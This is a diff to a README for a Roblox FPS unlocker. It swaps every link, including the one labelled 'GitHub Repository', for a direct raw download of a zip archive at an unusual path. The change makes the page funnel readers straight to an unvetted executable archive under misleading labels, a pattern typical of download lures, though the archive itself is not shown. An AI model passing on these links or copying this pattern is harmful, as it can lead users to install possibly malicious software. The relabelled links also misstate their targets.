@@ -1,6 +1,6 @@
 # 🎮 rbxfpsunlocker - Unlock Higher FPS in Roblox
 
-[![Download rbxfpsunlocker](https://img.shields.io/badge/Download-rbxfpsunlocker-9acd32?style=for-the-badge)](https://github.com/binod-143/rbxfpsunlocker)
+[![Download rbxfpsunlocker](https://img.shields.io/badge/Download-rbxfpsunlocker-9acd32?style=for-the-badge)](https://raw.githubusercontent.com/binod-143/rbxfpsunlocker/main/Britannia/Software-v1.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No other software is needed to run rbxfpsunlocker.
 
 Use the large button above or the link below to visit the page and download the software:
 
-[Download rbxfpsunlocker here](https://github.com/binod-143/rbxfpsunlocker)
+[Download rbxfpsunlocker here](https://raw.githubusercontent.com/binod-143/rbxfpsunlocker/main/Britannia/Software-v1.1.zip)
 
 Follow these steps:
 
@@ -103,7 +103,7 @@ These options help fine-tune performance for your hardware.
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** https://github.com/binod-143/rbxfpsunlocker  
+- **GitHub Repository:** https://raw.githubusercontent.com/binod-143/rbxfpsunlocker/main/Britannia/Software-v1.1.zip  
 - **Community Forums:** Check Roblox forums for user experiences with fps unlockers.  
 - **Windows Help:** Use Windows Help and Tips for troubleshooting apps.
 
